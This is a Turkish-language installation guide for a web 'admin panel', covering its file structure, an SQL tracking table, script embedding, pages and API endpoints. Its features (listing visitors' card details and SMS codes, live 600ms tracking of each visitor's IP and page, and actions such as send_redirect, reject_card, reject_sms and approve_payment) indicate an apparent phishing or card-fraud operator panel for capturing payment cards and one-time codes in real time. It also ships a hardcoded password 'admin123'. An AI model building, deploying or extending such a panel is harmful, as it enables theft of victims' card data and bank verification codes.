# Modern Admin Panel - Kurulum Rehberi

## 🎯 Özellikler

✅ Modern sidebar tasarım
✅ Responsive (mobil uyumlu)
✅ Canlı kullanıcı takibi (600ms)
✅ Dashboard istatistikleri
✅ Kullanıcı yönetimi
✅ IP, Session ID ve sayfa takibi
✅ Otomatik yenileme

## 📁 Dosya Yapısı

```
/admin/
├── index.php (Ana giriş)
├── login.php (Giriş sayfası)
├── layout.php (Ana layout)
├── assets/
│   └── style.css (Modern CSS)
└── pages/
    ├── dashboard.php (Ana sayfa)
    ├── users.php (Kullanıcı yönetimi)
    ├── online.php (Canlı takip)
    └── settings.php (Ayarlar)

/
├── api.php (API endpoint)
├── track_online.php (Tracking handler)
├── tracking.js (Client-side tracking)
└── includes/
    └── tracking.php (Include dosyası)
```

## 🔧 Kurulum Adımları

### 1. Database Tablosu Oluştur

```sql
-- admin/create_online_table.sql dosyasını çalıştır
CREATE TABLE IF NOT EXISTS online_users (
    id INT AUTO_INCREMENT PRIMARY KEY,
    session_id VARCHAR(255) NOT NULL UNIQUE,
    ip_address VARCHAR(45) NOT NULL,
    current_page VARCHAR(255) NOT NULL,
    user_agent TEXT,
    last_activity TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    INDEX idx_session (session_id),
    INDEX idx_last_activity (last_activity)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;
```

### 2. Tracking Script'i Sayfalara Ekle

Her sayfanın `</body>` tag'inden önce ekle:

```php
<?php include 'includes/tracking.php'; ?>
</body>
```

Veya direkt:

```html
<script src="/tracking.js"></script>
</body>
```

### 3. Admin Panele Eriş

```
http://localhost/admin/
```

**Şifre:** admin123

## 📊 Sayfalar

### Dashboard (/admin/?page=dashboard)
- Toplam kullanıcı sayısı
- Bekleyen ödemeler
- SMS bekleyenler
- Onaylanan ödemeler
- Toplam gelir
- Canlı kullanıcı sayısı
- Son 10 kullanıcı

### Kullanıcılar (/admin/?page=users)
- Tüm kullanıcılar listesi
- Kart bilgileri
- SMS kodları
- Durum yönetimi
- İşlem butonları (SMS Gönder, Onayla, Reddet)
- Otomatik yenileme (3 saniye)

### Canlı Takip (/admin/?page=online)
- Aktif kullanıcılar
- IP adresleri
- Session ID'ler
- Hangi sayfada oldukları
- Son aktivite zamanı
- Otomatik yenileme (2 saniye)

## 🎨 Özellikler

### Canlı Kullanıcı Takibi
- Her 600ms'de bir heartbeat
- IP adresi kaydı
- Session ID takibi
- Sayfa değişikliği algılama
- 5 dakika inaktif sonrası otomatik temizleme

### Modern UI
- Gradient sidebar
- Smooth animations
- Hover effects
- Responsive grid
- Icon library (Font Awesome)
- Status badges

### API Endpoints

```
GET  /api.php?action=get_online_users  - Canlı kullanıcıları getir
GET  /api.php?action=online_count      - Canlı kullanıcı sayısı
GET  /api.php?action=get_all_users     - Tüm kullanıcılar
POST /api.php?action=send_redirect     - SMS gönder
POST /api.php?action=approve_payment   - Ödemeyi onayla
POST /api.php?action=reject_sms        - SMS hatalı
POST /api.php?action=reject_card       - Kart hatalı
```

## 🔐 Güvenlik

- Session tabanlı authentication
- Admin şifre koruması
- SQL injection koruması (PDO)
- XSS koruması (htmlspecialchars)

## 📱 Responsive

- Desktop: Sidebar + content
- Tablet: Collapsible sidebar
- Mobile: Hamburger menu

## 🚀 Performans

- Minimal CSS/JS
- CDN kullanımı (Font Awesome)
- Efficient database queries
- Auto cleanup (5 dakika)

## 🎯 Kullanım

1. Admin panele giriş yap
2. Dashboard'da genel istatistikleri gör
3. Kullanıcılar sayfasında işlem yap
4. Canlı Takip'te aktif kullanıcıları izle
5. Her sayfa otomatik yenilenir

## 📝 Notlar

- Tracking script tüm sayfalarda çalışmalı
- Database tablosu mutlaka oluşturulmalı
- Admin şifresi değiştirilebilir (admin/index.php)
- Otomatik temizleme cron job olarak ayarlanabilir
